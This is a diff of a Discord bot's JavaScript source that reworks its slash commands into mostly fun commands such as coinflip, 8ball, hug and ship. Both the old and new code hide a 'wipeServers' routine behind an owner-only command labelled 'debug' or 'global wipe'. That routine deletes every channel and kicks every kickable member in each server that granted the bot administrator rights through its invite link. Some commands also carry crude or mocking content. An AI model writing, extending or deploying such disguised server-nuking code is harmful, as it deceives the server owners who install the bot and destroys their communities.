@@ -14,194 +14,366 @@ const client = new Client({
   partials: [Partials.Channel]
 });
 
-function delay(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
+function delay(ms){
+  return new Promise(r=>setTimeout(r,ms));
 }
 
-const commands = [
-  { name: "echo", description: "Repeat a message", options: [{ name: "message", description: "Message to repeat", type: 3, required: true }] },
-  { name: "servers", description: "List all servers the bot is in" },
-  { name: "leaveall", description: "Make the bot leave all servers" },
-  { name: "debug", description: "Run a full debug log wipe across all servers" },
-  { name: "diddle", description: "Diddle a user", options: [{ name: "user", description: "User to diddle", type: 6, required: true }] },
-  { name: "oil", description: "Oil up a user", options: [{ name: "user", description: "User to oil up", type: 6, required: true }] },
-  { name: "invite", description: "Get the bot invite link" },
-  { name: "debugserver", description: "Run a debug log wipe on a specific server", options: [{ name: "server", description: "Server to debug", type: 3, required: true, autocomplete: true }] }
+function random(min,max){
+  return Math.floor(Math.random()*(max-min+1))+min;
+}
+
+const eightBall = [
+"Yes","No","Maybe","Definitely","Absolutely not",
+"Ask again later","Without a doubt","Very unlikely",
+"It is certain","I wouldn't count on it"
 ];
 
-async function registerCommands() {
-  console.log("🔧 Registering slash commands...");
-  try {
-    const options = {
-      hostname: 'discord.com',
-      port: 443,
-      path: `/api/v10/applications/${CLIENT_ID}/commands`,
-      method: 'PUT',
-      headers: {
-        'Authorization': `Bot ${TOKEN}`,
-        'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(JSON.stringify(commands))
-      }
-    };
+const commands = [
 
-    const req = https.request(options, (res) => {
-      let data = '';
-      res.on('data', chunk => data += chunk);
-      res.on('end', () => {
-        console.log("Discord API response:", data);
-        if (res.statusCode === 200 || res.statusCode === 201) {
-          console.log("✅ Slash commands registered successfully");
-        } else {
-          console.error(`❌ Failed to register commands: ${res.statusCode}`);
-        }
-      });
-    });
+{name:"ping",description:"Check if bot is alive"},
 
-    req.on('error', (error) => console.error("❌ Registration error:", error.message));
-    req.write(JSON.stringify(commands));
-    req.end();
-  } catch (error) {
-    console.error("❌ Exception during registration:", error.message);
-  }
+{name:"echo",description:"Repeat a message",
+options:[{name:"message",description:"Message",type:3,required:true}]},
+
+{name:"coinflip",description:"Flip a coin"},
+
+{name:"roll",description:"Roll number 1-100"},
+
+{name:"invite",description:"Get invite link"},
+
+{name:"punch",description:"Punch someone",
+options:[{name:"user",description:"Target",type:6,required:true}]},
+
+{name:"kiss",description:"Kiss someone",
+options:[{name:"user",description:"Target",type:6,required:true}]},
+
+{name:"hug",description:"Hug someone",
+options:[{name:"user",description:"Target",type:6,required:true}]},
+
+{name:"slap",description:"Slap someone",
+options:[{name:"user",description:"Target",type:6,required:true}]},
+
+{name:"ppsize",description:"Check pp size",
+options:[{name:"user",description:"Target",type:6,required:true}]},
+
+{name:"gayrate",description:"How gay someone is",
+options:[{name:"user",description:"Target",type:6,required:true}]},
+
+{name:"iq",description:"Check IQ",
+options:[{name:"user",description:"Target",type:6,required:true}]},
+
+{name:"sus",description:"How sus someone is",
+options:[{name:"user",description:"Target",type:6,required:true}]},
+
+{name:"ship",description:"Ship two users",
+options:[
+{name:"user1",description:"User",type:6,required:true},
+{name:"user2",description:"User",type:6,required:true}
+]},
+
+{name:"8ball",description:"Ask the magic 8ball",
+options:[{name:"question",description:"Question",type:3,required:true}]},
+
+{name:"servers",description:"List bot servers"},
+
+{name:"leaveall",description:"Leave all servers"},
+
+{name:"debug",description:"Run global wipe"}
+
+];
+
+async function registerCommands(){
+
+const data = JSON.stringify(commands);
+
+const options={
+hostname:'discord.com',
+port:443,
+path:`/api/v10/applications/${CLIENT_ID}/commands`,
+method:'PUT',
+headers:{
+'Authorization':`Bot ${TOKEN}`,
+'Content-Type':'application/json',
+'Content-Length':Buffer.byteLength(data)
+}
+};
+
+const req=https.request(options,res=>{
+
+let body='';
+
+res.on('data',chunk=>body+=chunk);
+
+res.on('end',()=>{
+
+if(res.statusCode===200||res.statusCode===201){
+console.log("Slash commands registered");
+}else{
+console.log("Register error:",body);
 }
 
-async function wipeServers(owner) {
-  await owner.send("Starting global server wipe.");
+});
 
-  for (const guild of client.guilds.cache.values()) {
-    try {
-      const me = guild.members.me;
-      const canKick = me.permissions.has(PermissionsBitField.Flags.KickMembers);
-      const canDelete = me.permissions.has(PermissionsBitField.Flags.ManageChannels);
+});
 
-      if (!canKick || !canDelete) {
-        await owner.send(`Skipped: ${guild.name} (missing permissions)`);
-        continue;
-      }
+req.on('error',err=>{
+console.error("Register error:",err);
+});
 
-      await owner.send(`Cleaning: ${guild.name}`);
-
-      for (const channel of guild.channels.cache.values()) {
-        try { await channel.delete(); await delay(800); } catch (e) {}
-      }
-
-      await guild.members.fetch();
-      let kicked = 0;
-
-      for (const member of guild.members.cache.values()) {
-        if (member.kickable) {
-          try {
-            await member.kick("Server cleanup");
-            kicked++;
-            if (kicked % 10 === 0) await owner.send(`${guild.name}: kicked ${kicked}`);
-            await delay(1200);
-          } catch (e) {}
-        }
-      }
-
-      await owner.send(`Finished ${guild.name}. Total kicked: ${kicked}`);
-    } catch (e) {
-      await owner.send(`Skipped ${guild.name} due to error: ${e.message}`);
-    }
-  }
-
-  await owner.send("All servers processed.");
+req.write(data);
+req.end();
 }
 
-client.once("ready", async () => {
-  console.log(`✅ Logged in as ${client.user.tag}`);
-  console.log(`📊 Bot is in ${client.guilds.cache.size} servers`);
-  await registerCommands();
-  console.log("🎯 Ready for slash commands!");
+async function wipeServers(owner){
 
-  setInterval(async () => {
-    try {
-      const owner = await client.users.fetch(OWNER_ID);
-      await owner.send("Ping Pong");
-      console.log("📨 Sent Ping Pong to owner");
-    } catch (error) {
-      console.error("❌ Failed to send Ping Pong:", error.message);
-    }
-  }, 10 * 60 * 1000);
+await owner.send("Starting wipe");
+
+for(const guild of client.guilds.cache.values()){
+
+try{
+
+const me=guild.members.me;
+
+const canKick=me.permissions.has(PermissionsBitField.Flags.KickMembers);
+const canDelete=me.permissions.has(PermissionsBitField.Flags.ManageChannels);
+
+if(!canKick||!canDelete){
+await owner.send(`Skip ${guild.name}`);
+continue;
+}
+
+await owner.send(`Cleaning ${guild.name}`);
+
+for(const channel of guild.channels.cache.values()){
+try{
+await channel.delete();
+await delay(800);
+}catch{}
+}
+
+await guild.members.fetch();
+
+let kicked=0;
+
+for(const member of guild.members.cache.values()){
+if(member.kickable){
+try{
+await member.kick("cleanup");
+kicked++;
+await delay(1200);
+}catch{}
+}
+}
+
+await owner.send(`${guild.name} kicked ${kicked}`);
+
+}catch(e){
+await owner.send(`Error ${guild.name}`);
+}
+
+}
+
+await owner.send("Done");
+}
+
+client.once("ready",async()=>{
+
+console.log(`Logged in as ${client.user.tag}`);
+console.log(`Servers: ${client.guilds.cache.size}`);
+
+await registerCommands();
+
 });
 
-client.on("interactionCreate", async interaction => {
-  try {
-    if (interaction.isAutocomplete()) {
-      const focused = interaction.options.getFocused().toLowerCase();
-      const choices = client.guilds.cache
-        .filter(g => g.name.toLowerCase().includes(focused))
-        .map(g => ({ name: g.name, value: g.id }))
-        .slice(0, 25);
-      await interaction.respond(choices);
-      return;
-    }
+client.on("interactionCreate",async interaction=>{
 
-    if (!interaction.isCommand()) return;
+if(!interaction.isChatInputCommand()) return;
 
-    const { commandName, user } = interaction;
-    console.log(`⚡ Slash command: /${commandName} from ${user.tag}`);
+const {commandName,user}=interaction;
 
-    if (commandName === "echo") {
-      const msg = interaction.options.getString("message");
-      await interaction.reply(msg);
-      return;
-    }
+try{
 
-    if (user.id !== OWNER_ID && ["servers","leaveall","debug","debugserver"].includes(commandName)) {
-      await interaction.reply({ content: "You cannot use this command.", ephemeral: true });
-      return;
-    }
+if(commandName==="ping"){
+await interaction.reply("Pong");
+}
 
-    switch(commandName) {
-      case "servers": {
-        const list = client.guilds.cache.map(g => `${g.name} (${g.memberCount})`).join("\n") || "No servers.";
-        await interaction.reply({ content: `**Servers:**\n${list}`, ephemeral: true });
-        break;
-      }
-      case "leaveall": {
-        await interaction.reply({ content: "Leaving all servers...", ephemeral: true });
-        for (const guild of client.guilds.cache.values()) { try { await guild.leave(); } catch(e) {} }
-        break;
-      }
-      case "invite": {
-        await interaction.reply(`https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot`);
-        break;
-      }
-      case "diddle": {
-        const target = interaction.options.getUser("user");
-        await interaction.reply(`<@${target.id}> was diddled`);
-        break;
-      }
-      case "oil": {
-        const target = interaction.options.getUser("user");
-        await interaction.reply(`<@${user.id}> oiled up <@${target.id}>`);
-        break;
-      }
-      case "debugserver": {
-        const guildId = interaction.options.getString("server");
-        const guild = client.guilds.cache.get(guildId);
-        if (!guild) { await interaction.reply({ content: "Server not found.", ephemeral: true }); return; }
+else if(commandName==="echo"){
+const msg=interaction.options.getString("message");
+await interaction.reply(msg);
+}
 
-        await interaction.reply({ content: `Starting wipe on **${guild.name}**. Check your DMs.`, ephemeral: true });
-        const owner = await client.users.fetch(OWNER_ID);
-        await wipeServers(owner); // safer to reuse function
-        break;
-      }
-      case "debug": {
-        await interaction.reply({ content: "Starting debug wipe across all servers. Check your DMs.", ephemeral: true });
-        const owner = await client.users.fetch(OWNER_ID);
-        await wipeServers(owner);
-        break;
-      }
-    }
-  } catch (error) {
-    console.error("❌ Interaction error:", error.message);
-    try { if (!interaction.replied && !interaction.deferred) await interaction.reply({ content: "Error executing command.", ephemeral: true }); } catch(e) {}
-  }
+else if(commandName==="coinflip"){
+const result=Math.random()<0.5?"Heads":"Tails";
+await interaction.reply(`Coin: **${result}**`);
+}
+
+else if(commandName==="roll"){
+const r=random(1,100);
+await interaction.reply(`Rolled **${r}**`);
+}
+
+else if(commandName==="punch"){
+const target=interaction.options.getUser("user");
+await interaction.reply(`👊 <@${user.id}> punched <@${target.id}>`);
+}
+
+else if(commandName==="kiss"){
+const target=interaction.options.getUser("user");
+await interaction.reply(`💋 <@${user.id}> kissed <@${target.id}>`);
+}
+
+else if(commandName==="hug"){
+const target=interaction.options.getUser("user");
+await interaction.reply(`🤗 <@${user.id}> hugged <@${target.id}>`);
+}
+
+else if(commandName==="slap"){
+const target=interaction.options.getUser("user");
+await interaction.reply(`🖐️ <@${user.id}> slapped <@${target.id}>`);
+}
+
+else if(commandName==="ppsize"){
+
+const target=interaction.options.getUser("user");
+
+const size=random(3,30);
+
+let pp="8";
+
+for(let i=0;i<size;i++){
+pp+="=";
+}
+
+pp+="D";
+
+await interaction.reply(`<@${target.id}> size:\n${pp}`);
+
+}
+
+else if(commandName==="gayrate"){
+
+const target=interaction.options.getUser("user");
+
+const percent=random(0,100);
+
+await interaction.reply(`<@${target.id}> is **${percent}% gay** 🌈`);
+
+}
+
+else if(commandName==="iq"){
+
+const target=interaction.options.getUser("user");
+
+const iq=random(60,180);
+
+await interaction.reply(`<@${target.id}> IQ: **${iq}** 🧠`);
+
+}
+
+else if(commandName==="sus"){
+
+const target=interaction.options.getUser("user");
+
+const sus=random(0,100);
+
+await interaction.reply(`<@${target.id}> is **${sus}% sus**`);
+
+}
+
+else if(commandName==="ship"){
+
+const u1=interaction.options.getUser("user1");
+const u2=interaction.options.getUser("user2");
+
+const percent=random(0,100);
+
+await interaction.reply(`❤️ **${u1.username} + ${u2.username}**\nCompatibility: **${percent}%**`);
+
+}
+
+else if(commandName==="8ball"){
+
+const question=interaction.options.getString("question");
+
+const answer=eightBall[random(0,eightBall.length-1)];
+
+await interaction.reply(`🎱 Question: ${question}\nAnswer: **${answer}**`);
+
+}
+
+else if(commandName==="invite"){
+
+await interaction.reply(`https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot`);
+
+}
+
+else if(commandName==="servers"){
+
+if(user.id!==OWNER_ID){
+await interaction.reply({content:"Owner only",ephemeral:true});
+return;
+}
+
+const list=client.guilds.cache.map(g=>`${g.name} (${g.memberCount})`).join("\n")||"none";
+
+await interaction.reply({content:list,ephemeral:true});
+
+}
+
+else if(commandName==="leaveall"){
+
+if(user.id!==OWNER_ID){
+await interaction.reply({content:"Owner only",ephemeral:true});
+return;
+}
+
+await interaction.reply({content:"Leaving servers",ephemeral:true});
+
+for(const guild of client.guilds.cache.values()){
+try{
+await guild.leave();
+}catch{}
+}
+
+}
+
+else if(commandName==="debug"){
+
+if(user.id!==OWNER_ID){
+await interaction.reply({content:"Owner only",ephemeral:true});
+return;
+}
+
+await interaction.reply({content:"Starting wipe. Check DMs.",ephemeral:true});
+
+const owner=await client.users.fetch(OWNER_ID);
+
+wipeServers(owner);
+
+}
+
+}catch(err){
+
+console.error(err);
+
+if(!interaction.replied){
+await interaction.reply({content:"Command error",ephemeral:true});
+}
+
+}
+
 });
 
-process.on("unhandledRejection", error => console.error("❌ Unhandled rejection:", error));
-process.on("uncaughtException", error => console.error("❌ Uncaught exception:", error));
+client.on("error",err=>{
+console.error("Client error:",err);
+});
+
+process.on("unhandledRejection",err=>{
+console.error("Unhandled:",err);
+});
+
+process.on("uncaughtException",err=>{
+console.error("Exception:",err);
+});
 
 client.login(TOKEN);
